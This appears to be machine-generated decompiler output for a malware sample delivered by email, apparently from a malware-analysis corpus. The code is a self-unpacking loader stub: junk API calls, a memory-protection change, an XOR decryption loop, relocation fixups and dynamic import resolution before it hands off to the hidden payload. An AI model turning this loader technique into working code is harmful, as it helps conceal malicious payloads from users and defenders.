// subject.c
// Generated on 5/4/2015 12:43:50 AM by decompiling malware_via_email/malware_0115/ia32_pe/subject.exe
// using Decompiler version 0.4.2.0.

#include "subject.h"

void fn00401000(word32 ecx, word32 ebx)
{
fn00401000_entry:
l00401000:
	word32 esi_1058 = AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + 0x00000023 + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000) + AddAce(0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000)
	word32 ebp_1099 = 0x00000000
	branch AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l004012F9
l004012F6:
	esi_1058 = esi_1058 - 0x00000022
l004012F9:
	Mem1075[fp - 0x0000001C:word32] = 0x00000059
	CloseHandle(0xFFFFFFFF)
	Mem1080[fp - 0x0000001C:word32] = fp - 0x00000008
	Mem1082[fp - 0x00000020:word32] = 0x00000040
	Mem1084[fp - 0x00000024:word32] = 0x00003000
	Mem1086[fp - 0x00000028:word32] = 0x00401000
	VirtualProtect(0x00000000, 0x00000000, 0xFFFFFFFF, 0xFFFFFFFF)
	word32 edx_1089 = 0x00000000
l00401320:
	branch ebp_1099 != esi_1058 l00401329
l00401327:
	ebp_1099 = 0x00000000
l00401329:
	byte v15_1108 = Mem1086[edx_1089 + 0x00401480:byte] ^ Mem1086[ebp_1099 + 0x00404000:byte]
	Mem1109[edx_1089 + 0x00401480:byte] = v15_1108
	edx_1089 = edx_1089 + 0x00000001
	ebp_1099 = ebp_1099 + 0x00000001
	branch edx_1089 <u 0x00001420 l00401320
l00401349:
	word32 esi_1116 = 0x00402760
	word32 edi_1120 = 0x00000000
	word32 dwLoc04_1124 = 0x00000000
l00401370:
	word32 eax_1133 = Mem1109[esi_1116 + 0x00000004:word32] - 0x00000008 >>u 0x00000001
	word32 ecx_1136 = esi_1116 + 0x00000008
	branch eax_1133 <= 0x00000000 l004013AB
l0040137F:
	word32 ebx_1281 = eax_1133
l00401381:
	word32 eax_1285 = (word32) Mem1109[ecx_1136 + 0x00000000:word16]
	branch (eax_1285 & 0x0000F000) != 0x00003000 l0040139F
l00401394:
	word32 eax_1298 = (eax_1285 & 0x00000FFF) + Mem1109[esi_1116 + 0x00000000:word32]
	Mem1301[eax_1298 + 0x00401200:word32] = Mem1109[eax_1298 + 0x00401200:word32] + 0xF0401200
l0040139F:
	ecx_1136 = ecx_1136 + 0x00000002
	ebx_1281 = ebx_1281 - 0x00000001
	branch ebx_1281 != 0x00000000 l00401381
l004013A7:
	edi_1120 = dwLoc04_1124
l004013AB:
	edi_1120 = edi_1120 + Mem1109[esi_1116 + 0x00000004:word32]
	dwLoc04_1124 = edi_1120
	esi_1116 = esi_1116 + Mem1109[esi_1116 + 0x00000004:word32]
	branch edi_1120 <u 0x000000E4 l00401370
l004013C0:
	word32 esi_1152 = 0x00401F5C
	word32 dwLoc04_1153 = 0x00401F5C
	esi_1177 = esi_1152
	branch Mem1109[0x00401F6C:word32] == 0x00000000 l00401442
l004013D3:
	word32 esi_1177
	word32 eax_1182 = LoadLibraryA(Mem1109[esi_1177 + 0x0000000C:word32] + 0x00401200)
	branch eax_1182 == 0x00000000 l00401435
l004013E8:
	word32 edi_1205 = Mem1109[esi_1177 + 0x00000000:word32]
	branch edi_1205 != 0x00000000 l004013F1
l004013EE:
	edi_1205 = Mem1109[esi_1177 + 0x00000010:word32]
l004013F1:
	word32 eax_1211 = Mem1109[edi_1205 + 0x00401200:word32]
	word32 edi_1212 = edi_1205 + 0x00401200
	word32 esi_1213 = Mem1109[esi_1177 + 0x00000010:word32] + 0x00401200
	byte S_1216 = cond(eax_1211)
	branch eax_1211 == 0x00000000 l00401431
l004013FF:
	word32 eax_1250
	branch S_1216 l00401411
l00401401:
	eax_1250 = GetProcAddress(eax_1182, (word32) Mem1109[edi_1212 + 0x00000000:word16])
	goto l00401420
l00401411:
	eax_1250 = GetProcAddress(eax_1182, eax_1211 + 0x00401202)
l00401420:
	Mem1253[esi_1213 + 0x00000000:word32] = eax_1250
	edi_1212 = edi_1212 + 0x00000004
	eax_1211 = Mem1253[edi_1212 + 0x00000000:word32]
	esi_1213 = esi_1213 + 0x00000004
	S_1216 = cond(eax_1211) (alias)
	branch eax_1211 != 0x00000000 l004013FF
l00401431:
	esi_1177 = dwLoc04_1153
l00401435:
	esi_1177 = esi_1177 + 0x00000014
	dwLoc04_1153 = esi_1177
	branch Mem1109[esi_1177 + 0x00000010:word32] != 0x00000000 l004013D3
l00401442:
	call 0x00401C50 (retsize: 4; depth: 28)
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

